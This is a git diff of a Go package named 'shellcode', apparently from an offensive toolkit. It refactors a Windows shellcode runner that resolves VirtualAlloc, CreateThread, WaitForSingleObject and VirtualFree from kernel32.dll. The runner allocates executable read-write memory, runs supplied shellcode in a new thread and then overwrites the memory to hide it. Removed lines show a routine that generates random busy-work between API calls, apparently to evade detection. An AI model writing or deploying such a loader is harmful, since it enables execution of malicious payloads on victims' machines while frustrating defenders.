@@ -3,11 +3,8 @@
 package shellcode
 
 import (
-	"bytes"
-	"runtime"
 	"sync"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -16,54 +13,21 @@ import (
 )
 
 var (
-	initLoadDllOnce sync.Once
+	initFindProcThreadOnce sync.Once
 
-	rand *random.Rand
+	tVirtualAlloc        *syscall.Proc
+	tCreateThread        *syscall.Proc
+	tWaitForSingleObject *syscall.Proc
+	tVirtualFree         *syscall.Proc
 
-	kernel32            *syscall.DLL
-	virtualAlloc        *syscall.Proc
-	createThread        *syscall.Proc
-	waitForSingleObject *syscall.Proc
-	virtualFree         *syscall.Proc
-
-	initErr error
+	initThreadErr error
 )
 
-func doUseless(c chan []byte) {
-	buf := bytes.Buffer{}
-	rand := random.New(rand.Int64())
-	n := 100 + rand.Int(100)
-	for i := 0; i < n; i++ {
-		buf.Write(random.Bytes(16 + rand.Int(1024)))
-		c <- buf.Bytes()
-	}
-}
-
-func schedule() {
-	bChan := make(chan []byte, 1024)
-	n := 8 + rand.Int(8)
-	for i := 0; i < n; i++ {
-		go doUseless(bChan)
-	}
-	runtime.Gosched()
-read:
-	for {
-		select {
-		case b := <-bChan:
-			b[0] = byte(rand.Int64())
-		case <-time.After(25 * time.Millisecond):
-			break read
-		}
-	}
-	time.Sleep(time.Millisecond * time.Duration(50+rand.Int(100)))
-}
-
-func initLoadDll() {
-	rand = random.New(0)
-
+func initFindProcThread() {
 	schedule()
-	kernel32, initErr = syscall.LoadDLL("kernel32.dll")
-	if initErr != nil {
+	var kernel32 *syscall.DLL
+	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
+	if initThreadErr != nil {
 		return
 	}
 
@@ -72,31 +36,32 @@ func initLoadDll() {
 		name string
 	}{
 		{
-			&virtualAlloc,
+			&tVirtualAlloc,
 			"VirtualAlloc",
 		},
 		{
-			&createThread,
+			&tCreateThread,
 			"CreateThread",
 		},
 		{
-			&waitForSingleObject,
+			&tWaitForSingleObject,
 			"WaitForSingleObject",
 		},
 		{
-			&virtualFree,
+			&tVirtualFree,
 			"VirtualFree",
 		},
 	}
+
 	for i := 0; i < 4; i++ {
 		schedule()
-		p, err := kernel32.FindProc(procMap[i].name)
+		proc, err := kernel32.FindProc(procMap[i].name)
 		if err != nil {
-			initErr = err
+			initThreadErr = err
 			return
 		}
 		schedule()
-		*procMap[i].proc = p
+		*procMap[i].proc = proc
 	}
 }
 
@@ -109,11 +74,13 @@ func CreateThread(shellcode []byte) error {
 		return errors.New("no data")
 	}
 
-	initLoadDllOnce.Do(initLoadDll)
-	if initErr != nil {
-		return errors.WithStack(initErr)
+	initFindProcThreadOnce.Do(initFindProcThread)
+	if initThreadErr != nil {
+		return errors.WithStack(initThreadErr)
 	}
 
+	// allocate memory
+	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
 	const (
 		memCommit            = uintptr(0x1000)
 		memReserve           = uintptr(0x2000)
@@ -121,7 +88,7 @@ func CreateThread(shellcode []byte) error {
 		memRelease           = uintptr(0x8000)
 	)
 	schedule()
-	memAddr, _, err := virtualAlloc.Call(0, uintptr(l),
+	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
 		memReserve|memCommit, pageExecuteReadWrite)
 	if memAddr == 0 {
 		return errors.WithStack(err)
@@ -145,23 +112,23 @@ func CreateThread(shellcode []byte) error {
 		shellcode[i] = byte(rand.Int64())
 	}
 
+	// execute shellcode
 	schedule()
-	threadAddr, _, err := createThread.Call(0, 0, memAddr, 0, 0, 0)
+	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
-
 	schedule()
-	_, _, _ = waitForSingleObject.Call(threadAddr, 0xFFFFFFFF)
+	_, _, _ = tWaitForSingleObject.Call(threadAddr, 0xFFFFFFFF)
 
-	// cover shellcode and free memory
+	// cover shellcode and free allocated memory
 	schedule()
 	rand = random.New(0)
 	for i := 0; i < l; i++ {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i)))
 		*b = byte(rand.Int64())
 	}
-	_, _, _ = virtualFree.Call(memAddr, 0, memRelease)
+	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)
 
 	schedule()
 	return nil
